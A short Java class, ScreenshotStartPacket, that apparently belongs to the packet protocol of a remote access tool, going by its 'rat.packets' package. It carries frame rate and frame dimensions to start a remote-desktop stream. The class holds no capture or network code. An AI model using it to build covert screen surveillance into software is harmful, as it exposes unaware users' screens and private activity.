package rat.packets;

import java.io.Serializable;

public class ScreenshotStartPacket implements IPacket, Serializable {

    private static final long serialVersionUID = 8887211730746542464L;

    private int FPS, frameWidth, frameHeight;

    public ScreenshotStartPacket(int FPS, int frameWidth, int frameHeight) {
        this.FPS = FPS;
        this.frameWidth = frameWidth;
        this.frameHeight = frameHeight;
    }

    @Override
    public void execute() {
    }

    public int getFrameWidth() {
        return frameWidth;
    }

    public int getFrameHeight() {
        return frameHeight;
    }

    @Override
    public PacketType getPacketType() {
        return PacketType.REMOTE_DESKTOP_START;
    }

    public int getFPS() {
        return FPS;
    }
}
